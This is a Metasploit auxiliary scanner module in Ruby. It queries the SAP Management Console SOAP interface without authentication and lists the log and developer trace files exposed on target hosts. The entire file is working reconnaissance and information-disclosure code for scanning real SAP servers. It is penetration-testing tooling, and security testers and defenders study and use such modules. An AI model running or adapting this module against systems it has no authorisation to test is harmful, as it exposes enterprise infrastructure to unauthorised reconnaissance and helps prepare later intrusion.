##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'         => 'SAP Management Console List Logfiles',
			'Version'      => '$Revision$',
			'Description'  => %q{ This module simply attempts to output a list of available logfiles and developer tracefiles through the SAP Management Console SOAP Interface. },
			'References'   =>
				[
					# General
					[ 'URL', 'http://blog.c22.cc' ]
				],
			'Author'       => [ 'Chris John Riley' ],
			'License'      => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(50013),
				OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),
				OptString.new('FILETYPE', [true, 'Specify LOGFILE or TRACEFILE', 'TRACEFILE']),
				OptString.new('UserAgent', [ true, "The HTTP User-Agent sent in the request",
				'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' ]),
			], self.class)
		register_autofilter_ports([ 50013 ])
		deregister_options('RHOST')
	end

	def rport
		datastore['RPORT']
	end

	def run_host(ip)
		res = send_request_cgi({
			'uri'      => "/#{datastore['URI']}",
			'method'   => 'GET',
			'headers'  =>
				{
					'User-Agent' => datastore['UserAgent']
				}
		}, 25)
		return if not res

		listfiles(ip)
	end

	def listfiles(rhost)
		verbose = datastore['VERBOSE']
		print_status("[SAP] Connecting to SAP Management Console SOAP Interface on #{rhost}:#{rport}")
		success = false
		soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'
		xsi = 'http://www.w3.org/2001/XMLSchema-instance'
		xs = 'http://www.w3.org/2001/XMLSchema'
		sapsess = 'http://www.sap.com/webas/630/soap/features/session/'

		case "#{datastore['FILETYPE']}"
		when /LOGFILE/i
			ns1 = 'ns1:ListLogFiles'
		when /TRACEFILE/i
			ns1 = 'ns1:ListDeveloperTraces'
		end

		data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
		data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="' + soapenv + '"  xmlns:xsi="' + xsi + '" xmlns:xs="' + xs + '">' + "\r\n"
		data << '<SOAP-ENV:Header>' + "\r\n"
		data << '<sapsess:Session xlmns:sapsess="' + sapsess + '">' + "\r\n"
		data << '<enableSession>true</enableSession>' + "\r\n"
		data << '</sapsess:Session>' + "\r\n"
		data << '</SOAP-ENV:Header>' + "\r\n"
		data << '<SOAP-ENV:Body>' + "\r\n"
		data << '<' + ns1 + ' xmlns:ns1="urn:SAPControl"></' + ns1 + '>' + "\r\n"
		data << '</SOAP-ENV:Body>' + "\r\n"
		data << '</SOAP-ENV:Envelope>' + "\r\n\r\n"

		begin
			res = send_request_raw({
				'uri'      => "/#{datastore['URI']}",
				'method'   => 'POST',
				'data'     => data,
				'headers'  =>
					{
						'Content-Length' => data.length,
						'SOAPAction'     => '""',
						'Content-Type'   => 'text/xml; charset=UTF-8',
					}
			}, 30)

			env = []
			if res.code == 200
				case res.body
				when nil
					# Nothing
				when /<file>(.*)<\/file>/i
					body = []
					body = res.body
					env =body.scan(/<filename>(.*?)<\/filename><size>(.*?)<\/size><modtime>(.*?)<\/modtime>/i)
					success = true
				end
			else res.code == 500
				case res.body
				when /<faultstring>(.*)<\/faultstring>/i
					faultcode = "#{$1}"
					fault = true
				end
			end

		rescue ::Rex::ConnectionError
			print_error("[SAP] Unable to attempt authentication")
			return
		end

		if success
			print_good("[SAP] #{datastore['FILETYPE']}: #{env.length} entries extracted from #{rhost}:#{rport}")

			saptbl = Msf::Ui::Console::Table.new(
				Msf::Ui::Console::Table::Style::Default,
					'Header'  => 'SAP Logfiles',
					'Prefix'  => "\n",
					'Postfix' => "\n",
					'Columns' => [ 'Filename', 'Size', 'Date/Time' ]
				)

			env.each do |output|
				#print_status("Filename: #{output[0]}\tSize: #{output[1]}\tDate: #{output[2]}")
				saptbl << [ output[0], output[1], output[2] ]
			end

			print(saptbl.to_s)

			return

		elsif fault
			print_error("[SAP] Errorcode: #{faultcode}")
			return

		else
			print_error("[SAP] failed to request environment")
			return
		end
	end
end
